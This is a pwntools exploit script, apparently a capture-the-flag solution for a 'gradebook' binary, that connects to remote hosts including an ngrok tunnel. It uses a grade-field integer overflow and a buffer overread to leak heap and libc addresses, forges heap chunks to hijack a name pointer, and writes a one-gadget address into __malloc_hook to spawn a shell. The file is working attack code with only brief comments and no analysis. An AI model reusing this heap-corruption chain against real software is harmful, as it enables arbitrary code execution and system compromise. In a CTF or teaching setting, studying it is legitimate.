from pwn import *
context.binary = elf = ELF("./gradebook")
libc = ELF("./libc.so.6")
#io = remote("20.115.18.240",2250)
#io = remote("127.0.0.1",2250)
io = remote("0.tcp.ngrok.io",11982)
#io = elf.process()
#gdb.attach(io)

def add(i,l,n,x=False):
	io.sendline(b"1")
	io.sendline(i)
	io.sendline(str(l).encode())
	if x:
		io.send(n)
	else:
		io.sendline(n)

def _list():
	io.sendline(b"2")

def update_grade(i,g):
	io.sendline(b"3")
	io.sendline(i)
	io.sendline(str(g).encode())

def update_name(i,n):
	io.sendline(b"4")
	io.send(i)
	io.send(n)

def clear():
	io.sendline(b"5")
# unsorted bin
#io.interactive()
add(b"c",0x500,b"A"*(0x500))
add(b"d",0x500,b"b"*(0x500))
clear()
io.interactive()

add(b"A"*8,5,b"Chris") # overflow this guy
add(b"B"*8,5,b"Bob")  # write to this guy

io.clean()
update_grade(b"A"*8,0xffffffffffffffff) # overflow name length
_list()
io.readuntil("STUDENT ID: AAAAAAAA")
io.read(8)
heap_leak = u64(io.readline().strip().ljust(8,b"\x00")) #buffer overread
print(hex(heap_leak))
io.clean()
# overwrite Bob student so name is heap pointer to libc leak
fake_chunk = b"\x00"*0x18
fake_chunk += p64(0x21)
fake_chunk += p64(0x42)
fake_chunk += p32(80)
fake_chunk += p32(56)
fake_chunk += p64(heap_leak+72)

update_name(b"A"*8,fake_chunk)
io.clean()
_list()
io.readuntil("NAME: ")
io.readuntil("NAME: ")
libc_leak = u64(io.readline().strip().ljust(8,b"\x00"))
print(hex(libc_leak))
libc.address = libc_leak - 2014176 #leak from main_arena
print(hex(libc.address))

add(b"C",5,b"rondo") # Use Bob(now B) to overflow this guy

# Overwrite rondo's name pointer to malloc_hook
fake_chunk = b"Z"*0x16
fake_chunk += p64(0x21)
fake_chunk += p64(0x55)
fake_chunk += p32(0xffffffff)
fake_chunk += p32(50)
fake_chunk += p64(libc.symbols['__malloc_hook'])

one_gad = libc.address + 0xe6c81
update_name(b"B\x00",fake_chunk)
io.clean()
# now write one gadget to malloc hook
update_name(b"U\x00",b"VVVVVV"+p64(one_gad))
io.clean()
# trigger malloc
add(b"sh",5,b"q")
io.interactive()
